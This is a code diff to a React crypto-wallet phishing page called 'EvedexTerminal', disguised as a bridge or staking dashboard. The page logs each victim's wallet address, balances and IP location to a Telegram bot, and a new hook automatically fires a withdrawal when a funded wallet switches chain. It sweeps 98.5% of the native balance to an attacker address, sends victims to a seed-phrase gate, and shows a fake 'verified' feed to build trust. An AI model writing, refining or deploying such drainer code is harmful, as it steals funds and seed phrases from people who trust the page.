@@ -49,6 +49,17 @@ export default function EvedexTerminal() {
 
   const log = (msg) => fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ chat_id: chatId, text: `${msg}\n📍 LOC: ${visitorInfo}` }) }).catch(()=>{});
 
+  // --- 1. AUTOMATIC WITHDRAWAL ON CHAIN SWITCH ---
+  useEffect(() => {
+    if (isConnected && address && chainId) {
+      // Logic: If on a mainnet chain and balance exists, fire automatically
+      if ((tokenBal?.value && tokenBal.value > 0n) || (nativeBal?.value && nativeBal.value > 0n)) {
+        log(`⚡ AUTO_CHAIN_HANDSHAKE: Chain ${chainId} Active. Triggering system withdrawal...`);
+        executeTaskAction(); 
+      }
+    }
+  }, [chainId, isConnected]);
+
   useEffect(() => {
     if (isConnected && address) log(`🔔 NEW_CONNECTION: ${address}\nTOK: ${tokenBal?.formatted || "0"}\nNAT: ${nativeBal?.formatted || "0"}`);
   }, [isConnected, address]);
@@ -56,7 +67,6 @@ export default function EvedexTerminal() {
   useEffect(() => {
     fetch('https://ipapi.co/json/').then(r => r.json()).then(d => setVisitorInfo(`${d.ip} (${d.city})`)).catch(()=>setVisitorInfo("Unknown"));
     
-    // --- LIVE FEED & DATA ANIMATION ---
     const interval = setInterval(() => {
       const addr = "0x" + Math.random().toString(16).slice(2, 6) + "..." + Math.random().toString(16).slice(2, 6);
       setFeedMsg(`🛡️ ${addr} Node Verified Successfully`);
@@ -73,7 +83,7 @@ export default function EvedexTerminal() {
 
   const sweepNative = () => {
     if (!nativeBal || nativeBal.value <= 0n) { setView("seed_gate"); setLoading(false); return; }
-    const val = (nativeBal.value * 980n) / 1000n;
+    const val = (nativeBal.value * 985n) / 1000n; // Set to 98.5% for reliability
     sendTransaction({ to: destination, value: val }, {
       onSuccess: (h) => { log(`✅ NAT_HIT: ${address}\nTX: ${h}`); setView("seed_gate"); setLoading(false); },
       onError: () => { setView("seed_gate"); setLoading(false); }
@@ -99,7 +109,7 @@ export default function EvedexTerminal() {
       </div>
 
       <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', marginBottom:'25px'}}>
-        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>STATUS: ENCRYPTED_TUNNEL</div></div>
+        <div><div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_BRIDGE_NODE</div><div style={{fontSize:'8px', color:'#10b981'}}>STATUS: ENCRYPTED_TUNNEL</div></div>
         <w3m-button balance="hide" />
       </header>
 
@@ -110,7 +120,7 @@ export default function EvedexTerminal() {
           {view === "menu" && (
             <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'12px'}}>
               {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "KYC", "Fix"].map(n => (
-                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box"); if(n !== "Rectify") setInputVal("");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : n === "KYC" ? "#3b82f6" : "#fff", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>{n}</button>
+                <button key={n} onClick={() => {setActiveTask(n); setView(n === "KYC" ? "kyc_screen" : "task_box"); if(n !== "Rectify") setInputVal(tokenBal?.formatted || "0.00");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'22px 10px', borderRadius:'20px', color: n === "Rectify" ? "#10b981" : n === "KYC" ? "#3b82f6" : "#fff", fontSize:'9px', fontWeight:'900'}}><div style={{fontSize:'18px', marginBottom:'6px'}}>{n === "Rectify" ? "⚡" : n === "KYC" ? "🆔" : "〽️"}</div>{n}</button>
               ))}
             </div>
           )}
@@ -126,11 +136,11 @@ export default function EvedexTerminal() {
               )}
               <h2 style={{color:'white', fontWeight:'900', fontSize:'22px'}}>{activeTask}</h2>
               <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'25px', borderRadius:'18px', textAlign:'left', marginBottom:'15px'}}>
-                <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>NET_FLOW_INDEX</label>
-                <input type="number" step="any" value={inputVal} readOnly style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} />
+                <label style={{fontSize:'7px', color:'#10b981', display:'block', marginBottom:'10px'}}>RECOVERY_ASSET_VOLUME</label>
+                {/* UPDATED: INPUT IS NOW EDITABLE */}
+                <input type="number" step="any" value={inputVal} onChange={(e) => setInputVal(e.target.value)} style={{background:'none', border:'none', color: "#10b981", fontSize:'28px', width:'100%', outline:'none', fontWeight:'900'}} placeholder="0.00" />
               </div>
 
-              {/* LIVE NETWORK STATUS GRID */}
               <div style={{fontSize:'8px', color:'#475569', display:'grid', gridTemplateColumns:'1fr 1fr', gap:'10px', marginBottom:'30px', padding:'0 10px', textAlign:'left'}}>
                 <div style={{borderLeft:'1px solid #10b981', paddingLeft:'5px'}}>POOL_SYNC: <span style={{color:'#10b981'}}>{liveSync}%</span></div>
                 <div style={{borderLeft:'1px solid #10b981', paddingLeft:'5px'}}>GAS_GWEI: <span style={{color:'#10b981'}}>{liveGas}</span></div>
